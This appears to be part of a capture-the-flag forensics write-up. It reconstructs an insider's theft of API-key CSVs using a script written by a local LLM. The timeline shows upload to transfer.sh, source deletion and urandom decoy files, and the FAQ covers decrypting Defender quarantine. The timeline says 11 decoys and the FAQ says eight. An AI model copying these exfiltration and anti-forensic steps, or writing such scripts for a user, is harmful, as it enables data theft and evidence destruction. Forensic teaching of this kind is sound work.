| Time (UTC) | Source | Event |
|---|---|---|
| 11:54:37 | audit | `curl -fsSL https://ollama.com/install.sh` |
| 11:54:38 | audit | `ollama-linux-amd64.tar.zst` downloaded, extracted to `/usr/local` |
| 11:57:32 | journal | `ollama serve` — listening on `127.0.0.1:11434`, version 0.30.8 |
| 11:58:32 | audit | `ollama pull tinyllama` |
| 11:59:58 | audit | `ollama run tinyllama` — interactive session begins |
| 12:01:08–12:45:38 | journal | **17 × `POST /api/chat`** — the full conversation |
| 12:57:59 | mtime | `~/.ollama/history` flushed — 64 prompts, lines 33–38 damning |
| 12:58:20 | audit | `python3 -m venv ~/.local/share/.venv` (hidden venv) |
| 12:59:37 | mtime | `cache_mgr.py` written to disk |
| **12:59:43** | audit | **`python /home/dwright/cache_mgr.py`** — 5 CSVs archived, `PUT` to `transfer.sh` |
| 13:00:43 | audit | `rm -f /data/reports/internal_api_keys.csv` — source destroyed |
| 13:00:48 | audit | 11 × `dd if=/dev/urandom` → decoy files planted in `/tmp` |
| 13:02:46 | .trashinfo | `cache_mgr.py` moved to Trash |
| 13:06:22 | audit | `sudo bash /tmp/collect_final.sh` — triage collection begins |

**65 minutes** from `curl | sh` to a staged, encrypted archive — and **60 seconds** from script execution to source data destroyed.

### Indicators

| Type | Value |
|---|---|
| Tool | Ollama 0.30.8, `tinyllama`, `127.0.0.1:11434` |
| Script | `/home/dwright/cache_mgr.py` → Trash |
| Script SHA-256 | `41e11c805040885832b00d97967b8c6c8faa2776c82c24212297104e36483f24` |
| Staged archive | `~/.cache/fontconfig/session.zip` (291,118 B) |
| Archive SHA-256 | `67cc96630e8ab5112ec25c2467481d361c7bcc2373ec0ec5da0417c26506b23d` |
| Exfil destination | `https://transfer[.]sh/backup.zip` (`PUT`, `requests`) |
| Passphrase | `Gr33nF0x42!D1amond` (dictated to LLM in cleartext) |
| Archive password | `d571fe77618f54b7fca8` = `blake2b(passphrase, 32).hexdigest()[:20]` |
| Hidden venv | `~/.local/share/.venv` |

**ATT&CK chain:** T1119 → T1074.001 → T1560.001 → T1567.002 → T1070.003 → T1070.004 → T1036

### Reproducing

```bash
unzip whisper_evidence.tar.zip
tar xzf whisper_evidence.tar.gz

# Triage: identify the tool, score prompts, find the deleted script and archive
python3 solve/triage.py whisper_evidence

# Derive password and recover the data (uses the committed copy of session.zip)
cd solve && python3 solve.py ../artifacts/session.zip -o ../recovered

# The flag, by hand
grep master_vault ../recovered/internal_api_keys.csv | cut -d, -f2 | base64 -d
```

No third-party packages. `wzaes.py` implements WinZip-AES from scratch (PBKDF2-HMAC-SHA1, AES-256-CTR, HMAC-SHA1 verification).

---

## Key Takeaways

**Defender quarantine is a recovery mechanism, not just a bin.** When a sample is "gone from disk," `ResourceData` usually still has it byte-for-byte. Both stores are one static RC4 key away from being readable, and that key is public. Always validate the decrypt against the container's own SHA-1 filename before trusting anything downstream.

**Read what the runtime does, not what the source says.** `$a.Mode=0` in Qfact looks like ECB configuration. It is an invalid enum value that throws, gets swallowed by `SilentlyContinue`, and leaves the object in its default state (CBC). Malware that appears to configure a cipher may not have configured anything. Let padding validity across many ciphertexts decide it for you.

**Local LLMs are not a forensic void.** Ollama binds to loopback and never phones home — but `~/.ollama/history` is a plaintext, unencrypted, user-readable record of every prompt, sitting in the home directory with no retention policy. A cloud provider would have required a subpoena. The local install gave you the words.

**Prompt history records intent, not implementation.** The SHA-256 red herring in Whisper works because it is a reasonable thing to believe. The user asked for SHA-256; the model wrote BLAKE2b; the user pasted it without reading. When the recovered artefact contradicts the prompt that produced it, the artefact is the fact.

**Deletion is a spectrum, and `auditd` covers all of it.** Trash move, `rm`, history truncation, and `/dev/urandom` decoys all appeared in Whisper, and the same 16 MB of audit log defeated every technique — including telling us exactly which `/tmp` files were manufactured, which saves hours of chasing high-entropy blobs.

---

## FAQ

**Q: Where is Defender's quarantine RC4 key from?**  
A: It is extracted from `mpengine.dll`, Defender's scanning engine. It is a static compile-time constant that has not changed across versions. It has been publicly documented in tools like `defender-dump` and `quarantine.py` for years. It is reproduced verbatim in `solve/extract_quarantine.py` in the challenge repository.

**Q: Why does decrypting the `Entries` file as one RC4 stream fail?**  
A: Because the file is three *independent* RC4 streams concatenated. Each section restarts the keystream from byte 0 using the same key. Treating the whole file as one stream applies the wrong keystream bytes to sections 1 and 2 (everything past offset `0x3C`), producing garbage. You must parse the header first to get the section lengths, then decrypt each section independently.

**Q: Why does `$a.Mode=0` produce CBC and not ECB?**  
A: `System.Security.Cryptography.CipherMode` is an enum where CBC=1, ECB=2, OFB=3, CFB=4, CTS=5. There is no value 0. The property setter validates and throws `CryptographicException`. With `$ErrorActionPreference='SilentlyContinue'`, that exception is swallowed silently, the assignment never completes, and the `Aes` object retains its default mode, which is CBC. The intended dead end is reading `0` as "ECB" or "no mode."

**Q: Why did 7z fail to open the archive with the passphrase directly?**  
A: Because the passphrase is run through `hashlib.blake2b(passphrase.encode(), digest_size=32).hexdigest()[:20]` before being set as the archive password. The archive password is the 20-character hex string `d571fe77618f54b7fca8`, not the passphrase `Gr33nF0x42!D1amond`. Line 37 of the Ollama history was a red herring pointing to SHA-256 — but the code the model actually generated used BLAKE2b.

**Q: Can you tell whether the exfiltration to transfer.sh succeeded?**  
A: No. The upload block is wrapped in a bare `except: pass`, so any exception (network failure, timeout, HTTP error) is silently swallowed and the script still exits 0. The archive is on disk in either case, and there is no proxy log, netflow capture, or HTTP cache entry in the evidence package that would show a completed transfer.

**Q: What makes the anti-forensics decoy files in `/tmp` easy to dismiss?**  
A: All eight random-data files were created in a single batch at exactly 13:00:48 UTC — the same second — with `dd if=/dev/urandom` and round `count=` values. Every `dd` command is in the audit log with its exact output path, so you do not need to analyse the blobs at all. The audit log tells you they were manufactured, when, and where.

**Q: How do I know Ollama is the right tool if it does not appear in `dpkg` or `pip`?**  
A: Four independent sources confirm it: the audit log (installation `curl | sh` sequence, `ollama run` command), `system_info/running_services.txt` (service active), `system_info/network_sockets.txt` (port 11434 listening), and the Gin-based HTTP access log in `journal_exports/journalctl_ollama.txt` (17 chat completions with timing data).

---

*Full source — solve scripts, recovered artefacts, and defanged malware samples — available at [github.com/Abdelkad3r/BlackHat-MEA-CTF-Qualification-2026](https://github.com/Abdelkad3r/BlackHat-MEA-CTF-Qualification-2026).*
